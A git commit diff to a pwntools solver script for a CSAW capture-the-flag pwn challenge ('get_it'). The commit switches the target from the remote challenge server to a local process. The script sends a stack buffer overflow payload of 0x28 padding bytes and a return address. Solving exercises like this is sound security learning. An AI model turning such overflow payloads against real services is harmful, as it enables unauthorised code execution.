da69966041cfcdfac01b22c5ab3ffaa870c47adb
katipuzer0 <katipuzero@gmail.com>
2021-04-08 22:32:06 -0400

    edits

--- pwn-chall-csaw/solver.py
+++ pwn-chall-csaw/solver.py
@@ -1,9 +1,9 @@
 #!/usr/bin/env python
 from pwn import *
-#p = process("./get_it")
+p = process("./get_it")
 #p = remote("localhost", 1437)
 
-p = remote("pwn.chal.csaw.io", 9001)
+#p = remote("pwn.chal.csaw.io", 9001)
 p.recvuntil("??")
 p.sendline("A" * 0x28 + p64(0x4005b6))
 
